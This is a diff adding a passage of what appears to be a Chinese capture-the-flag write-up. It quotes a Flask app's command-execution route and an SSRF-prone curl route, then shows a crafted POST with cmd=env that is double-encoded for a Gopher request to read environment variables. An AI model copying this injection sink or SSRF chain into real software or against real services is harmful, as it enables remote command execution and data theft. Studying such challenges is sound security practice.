+                }
+                .btn-success:hover {
+                    background-color: #218838;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Register</h3>
+                    </div>
+                    <div class="card-body">
+                        <form method="POST">
+                            <div class="mb-3">
+                                <label for="username" class="form-label">Username</label>
+                                <input type="text" class="form-control" id="username" name="username" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="password" class="form-label">Password</label>
+                                <input type="password" class="form-control" id="password" name="password" required>
+                            </div>
+                            <button type="submit" class="btn btn-success w-100">Register</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </body>
+        </html>
+    """)
+```
+
+/Manage,典型的SSRF,我们需要本地127.0.0.1并且是POST传入cmd,在os模块中执行命令
+
+```python
+@app.route('/Manage', methods=['POST'])
+def cmd():
+    if request.remote_addr != "127.0.0.1":
+        return "Forbidden!!!"
+    if request.method == "GET":
+        return "Allowed!!!"
+    if request.method == "POST":
+        return os.popen(request.form.get("cmd")).read()
+```
+
+/Gopher,题目和这个Gopher提示的很明显了,重点就在这里.
+
+这里需要传入一个url
+
+```python
+@app.route('/Gopher')
+def visit():
+    url = request.args.get('url')
+    if url is None:
+        return "No url provided :)"
+    url = urlparse(url)
+    realIpAddress = socket.gethostbyname(url.hostname)
+    if url.scheme == "file" or realIpAddress in BlackList:
+        return "No (≧∇�?)"
+    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
+    return result.stdout
+```
+
+先从/Manage的路由抓一个包,看看环境变量,
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464502930-0432a773-4453-4e0b-8d37-0a99b4bb7011.png)
+
+先构造
+
+```http
+POST /Manage HTTP/1.1
+Host:127.0.0.1
+Content-Type:application/x-www-form-urlencoded
+Content-Length:7
+
+cmd=env
+```
+
+url两次编码:
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464503145-c1356386-7e5e-44af-8132-df8f45d891b2.png)
+
+发包即可得到flag
+
+![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464503377-9f960cae-54d8-4189-b747-eec50f7e053d.png)
+
